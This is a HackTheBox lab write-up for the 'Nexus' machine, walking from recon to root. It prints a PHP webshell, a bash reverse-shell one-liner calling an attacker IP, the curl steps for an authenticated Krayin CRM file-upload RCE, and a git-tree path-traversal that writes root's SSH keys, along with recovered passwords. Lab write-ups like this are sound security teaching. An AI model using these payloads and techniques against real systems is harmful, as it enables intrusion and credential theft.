# HackTheBox — Nexus

**Target:** 10.129.45.172   **DNS:** nexus.htb   **OS:** Linux (Ubuntu 24.04)   **Difficulty:** Easy   **Date:** 2026-07-03
**Status:** ROOTED — user `4ddb6d1886588d76e9a8ff226f316b71` / root `d7160cc392429e572a9bc2fd9f0704a9`

## Recon

### Nmap (`-Pn -A -sV`)
- **22/tcp** — OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
- **80/tcp** — nginx 1.24.0 (Ubuntu); redirects `http://10.129.45.172/` → `http://nexus.htb/`
  - Methods: GET HEAD POST OPTIONS
- OS: Linux 4.15–5.19

**Prerequisite:** `nexus.htb` added to `/etc/hosts`.

### Live Notes
- Only two ports. Attack surface is the web app on 80. SSH is the foothold pivot once creds are found (matches roadmap).
- Next: fingerprint the web app, enumerate vhosts + directories.

### Intended Attack Chain (from machine "About")
1. **Exposed Gitea repository** leaks credentials + a **job posting reveals valid usernames**.
2. Leaked creds → **Krayin CRM**, vulnerable to **CVE-2026-38526** → shell as **www-data**.
3. Krayin CRM **config files** → additional creds → **SSH access** (user).
4. **Gitea template sync service** vulnerable to **directory traversal** → shell as **root**.

**Implication for recon:** expect vhosts — likely `gitea.nexus.htb` (Gitea) and a Krayin CRM host. Enumerate vhosts first.

## Foothold

### Usernames (from job posting on main site)
- Job listing: **"Operations Specialist – Customer Platforms"**
- Hiring manager: **`j.matthew@nexus.htb`** → username **`j.matthew`**
- Applications: `careers@nexus.htb`
- **Naming convention: `<first-initial>.<lastname>`** — apply to any other names found (e.g. in Gitea commits/authors).

### vhost enumeration
- `ffuf` on `dnsmap.txt` with `-fs 154` (bogus-vhost baseline) → **`git.nexus.htb`** (200, 14474 bytes) = **Gitea** instance.
- Added `git.nexus.htb` to `/etc/hosts`.

### Gitea → leaked credential
- Public repo: **`admin/krayin-docker-setup`** (owner `admin@nexus.htb`). Working tree has empty `DB_PASSWORD=`.
- **Credential is in git history** — `git log -p --all` shows commit `1615c46` added then a later commit scrubbed:
  - `DB_PASSWORD=N27xh!!2ucY04`
- Also seen: `IMAP_USERNAME=username1 / IMAP_PASSWORD=password1` (Krayin defaults, likely noise), `MAIL_FROM_ADDRESS=laravel@krayincrm.com`.
- **Candidate creds for Krayin CRM:** `j.matthew` (or `j.matthew@nexus.htb`) : **`N27xh!!2ucY04`**.
- *Lesson: `.env` placeholders empty in HEAD → always `git log -p --all`; the secret was committed and removed.*

### Krayin CRM vhost
- `crm.nexus.htb` = default 302/154 (not real). `nexus.htb/admin/login` = 404.
- Bigger vhost fuzz (`directory-list-2.3-medium`, `-fs 154`) → **`billing.nexus.htb`** (302, 390) = Krayin CRM.
- Added `billing.nexus.htb` to `/etc/hosts`.
- `/` → 302 → **`/admin/login`**, title "Sign In", `alt="Krayin CRM"`, cookie `krayin_crm_session`. **Confirmed Krayin CRM.**
- **Debug info leak:** `APP_DEBUG=true`, `APP_ENV=local` → **Laravel Debugbar exposed** in responses. Reveals:
  - **Laravel 12.54.1 / PHP 8.3.6**, app path **`/var/www/krayin`**, DB connection `krayin`.
  - CSRF `_token` and intended URL `/admin/dashboard` are dumped in the debug payload — useful for scripted login.
- **Login success:** **`j.matthew@nexus.htb : N27xh!!2ucY04`** → `/admin/dashboard`. Credential reuse confirmed (the "DB_PASSWORD" was also the CRM login).

### CVE-2026-38526 — Krayin CRM authenticated file upload → RCE (CWE-434)
- Affects Krayin CRM v2.2.x. Vulnerable endpoint: **`POST /admin/tinymce/upload`** (`TinyMCEController.php`) — no MIME/extension allowlist, stores in a **web-accessible** dir **`/storage/tinymce/`**.
- Attack: authenticate → POST a `.php` file → note returned path in JSON → **GET the file → PHP executes as `www-data`**.
- Needs Laravel CSRF `_token` + `krayin_crm_session` cookie (we have a valid session as `j.matthew`).
- **CSRF gotcha (419):** Laravel rotates the CSRF token on login, so the login-page `_token` is stale for the upload. Two fixes: (a) scrape the fresh token from an authed page, or (b) **cleaner** — send the post-login **`XSRF-TOKEN` cookie value URL-decoded as the `X-XSRF-TOKEN` header**; Laravel *decrypts* it server-side and matches it to the session (this is what Krayin's own JS does). Approach (b) worked first try.
- **Exploit worked** (manual curl, one session/cookie jar):
  1. GET `/admin/login` → grab `_token`.
  2. POST `/admin/login` (email/password/_token) → session persisted.
  3. `XSRF=$(grep XSRF-TOKEN cj.txt | awk '{print $NF}' | sed 's/%3D/=/g')`.
  4. POST `/admin/tinymce/upload` with `-H "X-XSRF-TOKEN: $XSRF" -F "file=@shell.php;type=image/jpeg"`.
  5. Response: `{"location":"http://billing.nexus.htb/storage/tinymce/<hash>.php"}`.
  6. GET `.../storage/tinymce/<hash>.php?cmd=id` → **`uid=33(www-data)`**. RCE confirmed.
- Webshell payload: `<?php system($_GET["cmd"]); ?>`.
- *(Note: reset j.matthew's CRM password to `password` to dodge zsh history-expansion on the `!!` in the real password.)*

- **Reverse shell:** listener `nc -lvnp 4444`; trigger `cmd=bash -c "bash -i >& /dev/tcp/10.10.16.141/4444 0>&1"` via the webshell → shell as **www-data**. Stabilized with `python3 -c 'import pty;pty.spawn("/bin/bash")'` + `stty raw -echo; fg`.

## Privilege Escalation

### Step 3 — Krayin config → SSH creds (user)
- App root: `/var/www/krayin`. Landed in `/var/www/krayin/storage/app/public/tinymce` (webshell dir).
- **Live `/var/www/krayin/.env`** → **`DB_PASSWORD=y27xb3ha!!74GbR`** (DB user `krayin`). **Different** from the git-leaked `N27xh!!2ucY04` — this is the "additional credential", almost certainly reused for an SSH user.
- APP_KEY: `base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=`.
- Human accounts (`/etc/passwd`): `root`, **`jones`** (uid 1000, `/home/jones`), `git` (Gitea).
- **SSH `jones : y27xb3ha!!74GbR`** → success (Ubuntu 24.04). **User flag: `4ddb6d1886588d76e9a8ff226f316b71`**.

### Step 4 — Gitea template-sync dir-traversal → root
- `jones`: no sudo. Gitea web bound to `127.0.0.1:3000`.
- **`gitea-template-sync.timer`** runs **every ~60s** → `gitea-template-sync.service` → `ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py` as **`User=root`**.

**The vulnerability in `/etc/gitea/template-sync.py`:** for every Gitea repo marked `template:true`, it runs `git ls-tree -r HEAD` on the bare repo, then for each blob writes it to:
```
target = os.path.join(STAGING_DIR, owner, name, filepath)   # STAGING_DIR=/home/git/template-staging
os.makedirs(os.path.dirname(target)); open(target,'wb').write(blob)
```
`filepath` is taken **verbatim from the git tree** with no sanitization. `os.path.join` doesn't collapse `..`, and `open()`/`makedirs()` resolve it on disk → **path traversal → arbitrary file write as root.**

**Exploit plan:** craft a template repo containing a blob whose tree path is `../../../../../root/.ssh/authorized_keys` (staging is 5 levels deep: `/home/git/template-staging/<owner>/<name>` → 5×`..` reaches `/`). Content = our SSH public key. The sync writes it as root → SSH in as root.
- `..` components must be built with git plumbing (`git mktree` nesting), since normal `git add` won't create them.
- Repo must be **public** (so the token's `repos/search` sees it) and flagged **template**.
- `template-sync.conf` (holds `GITEA_API_TOKEN`) is `git:git 640` — **jones cannot read it**. So we don't reuse the token; instead we **create our own public template repo** with a self-registered Gitea account. Log confirms it runs every 60s and currently finds **0 template repos** → our repo will be picked up immediately.
- **Gitea registration is disabled**, and `j.matthew` is a *Krayin* admin (separate app), so it can't enable it. Solution = **credential reuse**: **`jones : y27xb3ha!!74GbR` is also a valid Gitea login** (confirmed via `GET /api/v1/user` = 200). jones can create/push the template repo.
- Traversal filepath (5 levels): **`../../../../../root/.ssh/authorized_keys`**, content = our SSH pubkey. Built with nested `git mktree` (`..` tree entries). Exploit script: `scripts/nexus_root_template_traversal.sh jones 'y27xb3ha!!74GbR' root_key.pub`.
- Ran the exploit → repo `jones/tpl` created, malicious tree pushed, flagged template. (Local git prints harmless `Permission denied` warnings resolving the `..` path on the attack box; the push succeeds regardless.)
- Log confirmed: `Found 1 template repo(s)` → `Syncing template: jones/tpl` → `synced: ../../../../../root/.ssh/authorized_keys`.
- **`ssh -i root_key root@nexus.htb`** → **root**. **Root flag: `d7160cc392429e572a9bc2fd9f0704a9`**.

## Lessons Learned
- **`git log -p --all` on any leaked repo.** The live `.env` had an empty `DB_PASSWORD`; the real secret was a *scrubbed* earlier commit. Secrets removed in HEAD still live in history.
- **Credential reuse is the connective tissue of this box.** One git-leaked password → Krayin login; a second `.env` password → both SSH (`jones`) *and* Gitea (`jones`). Always spray every recovered password across every service (SSH, the CRM, Gitea API).
- **Laravel CSRF (419) on a scripted upload:** after login Laravel rotates the token, so the login-page `_token` is dead. Cleanest bypass = send the post-login **`XSRF-TOKEN` cookie value (URL-decoded) as the `X-XSRF-TOKEN` header** — Laravel decrypts it and matches the session (this is what the app's own JS does). Beats scraping a fresh token.
- **CVE-2026-38526 (Krayin TinyMCE upload):** unauthenticated-adjacent (any logged-in user) arbitrary file upload → RCE; file lands in web-accessible `/storage/tinymce/`. Spoof `Content-Type: image/jpeg`, name it `.php`.
- **`APP_DEBUG=true` is a gift.** The Laravel Debugbar dumped file paths, the exact CSRF `TokenMismatchException`, session token values, SQL, and framework versions — it told us *why* the 419 happened.
- **Path traversal via git tree filenames → arbitrary write as root.** A root service that extracts a repo's blobs to `join(base, owner, name, filepath)` with `filepath` straight from `git ls-tree` is exploitable: craft `..` path components with **nested `git mktree`** (normal `git add` won't create them), point at `/root/.ssh/authorized_keys`, mark the repo a template, wait for the timer.
- **Enumerate local services for privesc.** No sudo, no SUID needed — `systemctl list-timers` exposed a custom root timer (`gitea-template-sync.timer`); reading its unit → its script → the bug.

## Reusable Assets
- `scripts/krayin_cve-2026-38526.sh` — Krayin CVE-2026-38526 login + webshell upload (note the `X-XSRF-TOKEN` header approach used in the manual run beats the meta-scrape).
- `scripts/nexus_root_template_traversal.sh` — build a `..`-traversal git tree via `git mktree`, push to Gitea, flag as template (generic pattern for "sync-from-git" root services).

## Lessons Learned
_TBD_
